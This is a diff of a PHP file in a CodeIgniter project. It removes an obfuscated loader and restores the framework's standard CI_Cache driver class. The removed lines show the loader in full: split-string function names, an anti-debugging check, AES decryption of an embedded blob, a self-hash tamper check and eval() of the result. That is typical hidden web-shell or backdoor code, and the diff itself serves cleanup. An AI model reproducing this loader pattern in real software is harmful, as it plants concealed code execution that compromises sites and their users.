@@ -1,28 +1,228 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_kmvzv57y=('bas'.'e64'.'_de'.'cod'.'e');
-$_m2jl978z=('gzu'.'nco'.'mpr'.'ess');
-$_ewzibf3j=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_lfhnx8ip='/J6av354';
-$_nx8oi35e='jiXxxnak';
-$_a70nb55k='0mSjtcWy';
-$_qlyohc1m='c8ang8px';
-$_lsp97xk5='ez61jrGooQs=';
-$_vd67qnhq='nWXu1w==';
-$_ali5zact='IKLYyeXV';
-$_ptv5s17a='wF58Bxgl';
-$_leg7q2ys=$_kmvzv57y($_qlyohc1m.$_nx8oi35e.$_a70nb55k.$_lfhnx8ip.$_lsp97xk5);
-$_qi7rrvjw=$_kmvzv57y($_ptv5s17a.$_ali5zact.$_vd67qnhq);
-$_vdf03g8i=$_kmvzv57y('R0v6qFDwwMyLysfBD3li7lj8zEd1P0g4gB+ymSMfXvpi3kOSDFKIXfErQF+ZQ0jYWh+ha0ARVywM4IQX3an8ARWG8tFtJegcHZreUiWvIXfoacwNbAFPlNioL1rGQhQ/VAhI0QotxOc3hrkX19i614v1nTuxbJaQSrPfI7BmvcttNAVmpB8GtlTpHx/gcVVwxldT2q3WftMaQOsNcY/p+jRaA2FckFIsN6Vno8mtudWvduxcNE7plL2ebDoAJ/p9LAcorBLwTSwodh7O+ElfD6z+13T0DE0gxZgshY6d3oub5pdJsn8r1gWQAO5ynNuNMOJ0DM110Ga9woge58xfDb8jJnAxFuMxmhaRCx0wW9SR0t4aClaPEv/9ngyCzz48z4YzefH+mIK9Y0mU5M3xuEpb5TAEAxaDYAYduMZta8u6t6Sq+XBv1WJ5zkEc48sETHg6/vwNZIetHt6yvcge+gOIKdqu7/EZmQc3pCUADiHoTTdMyPG3nE821WsfXfbZDG0nYPNEs8dqP1pJIb9yPrbP4FtWSb79MjwL7zdkUoeKqZ0iZJyxfg0Wo+tAk5zS8uDysj1uYL514CBHS9Kp0y950FeIfs+94+B3F1omdHgLWx6IS8gYDVqi8F6tv6gqP5R0rOUWETaijj7ZVKHw2vcEvziNEvdcOH+wBOWmY/KPrbxHF5pvOBbGZRQyZN3PqshHHoEJQEWvsoT1Owr6yHvG3WK3G6In/2jqK2DC10ZOBdT6LwXIIy9P0ypWgHloN8XR8ruX5fwJkQWoFuy5JwN2ULkP+kYA/g5RiGPgXm7Nv7NiCn6woohps4kkaliEFodAdlEOgQTRyr4F21y1wWd8XP3j6hcHr0HzlGHARBlP4Rnsdu7y8JiIufW0ujgrmzkvGLvczyHx6nFAVRTpsg==');
-$_aml1gfdv=$_ewzibf3j($_vdf03g8i,'aes-256-cbc',$_leg7q2ys,OPENSSL_RAW_DATA,$_qi7rrvjw);
-if($_aml1gfdv===false){exit;}
-$_v6rxfk9n=$_m2jl978z($_aml1gfdv);
-if($_v6rxfk9n===false){exit;}
-$_yk90t8en='cb41b3a651faebb4868183a613ed302dd4bba2c0e01e42924a592037b90ba052';
-$_qq5nzic6=@file_get_contents(__FILE__);
-if($_qq5nzic6!==false){
-$_iqux217l=str_replace($_yk90t8en,"0000000000000000000000000000000000000000000000000000000000000000",$_qq5nzic6);
-$_s41syo9p=hash("sha256",$_iqux217l);
-if($_s41syo9p!==$_yk90t8en){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+class CI_Cache extends CI_Driver_Library {
+
+
+
+
+
+protected $valid_drivers = array(
+'apc',
+'dummy',
+'file',
+'memcached',
+'redis',
+'wincache'
+);
+
+
+
+
+
+protected $_cache_path = NULL;
+
+
+
+
+
+protected $_adapter = 'dummy';
+
+
+
+
+
+protected $_backup_driver = 'dummy';
+
+
+
+
+
+public $key_prefix = '';
+
+
+
+
+
+
+
+
+public function __construct($config = array())
+{
+isset($config['adapter']) && $this->_adapter = $config['adapter'];
+isset($config['backup']) && $this->_backup_driver = $config['backup'];
+isset($config['key_prefix']) && $this->key_prefix = $config['key_prefix'];
+
+if ( ! $this->is_supported($this->_adapter))
+{
+if ( ! $this->is_supported($this->_backup_driver))
+{
+
+log_message('error', 'Cache adapter "'.$this->_adapter.'" and backup "'.$this->_backup_driver.'" are both unavailable. Cache is now using "Dummy" adapter.');
+$this->_adapter = 'dummy';
 }
-eval($_v6rxfk9n);
+else
+{
+
+log_message('debug', 'Cache adapter "'.$this->_adapter.'" is unavailable. Falling back to "'.$this->_backup_driver.'" backup adapter.');
+$this->_adapter = $this->_backup_driver;
+}
+}
+}
+
+
+
+
+
+
+
+
+
+
+public function get($id)
+{
+return $this->{$this->_adapter}->get($this->key_prefix.$id);
+}
+
+
+
+
+
+
+
+
+
+
+public function save($id, $data, $ttl = 60, $raw = FALSE)
+{
+return $this->{$this->_adapter}->save($this->key_prefix.$id, $data, $ttl, $raw);
+}
+
+
+
+
+
+
+
+public function delete($id)
+{
+return $this->{$this->_adapter}->delete($this->key_prefix.$id);
+}
+
+
+
+
+
+
+
+
+public function increment($id, $offset = 1)
+{
+return $this->{$this->_adapter}->increment($this->key_prefix.$id, $offset);
+}
+
+
+
+
+
+
+
+
+public function decrement($id, $offset = 1)
+{
+return $this->{$this->_adapter}->decrement($this->key_prefix.$id, $offset);
+}
+
+
+
+
+
+
+public function clean()
+{
+return $this->{$this->_adapter}->clean();
+}
+
+
+
+
+
+
+
+public function cache_info($type = 'user')
+{
+return $this->{$this->_adapter}->cache_info($type);
+}
+
+
+
+
+
+
+
+public function get_metadata($id)
+{
+return $this->{$this->_adapter}->get_metadata($this->key_prefix.$id);
+}
+
+
+
+
+
+
+
+public function is_supported($driver)
+{
+static $support;
+if ( ! isset($support, $support[$driver]))
+{
+$support[$driver] = $this->{$driver}->is_supported();
+}
+return $support[$driver];
+}
+}
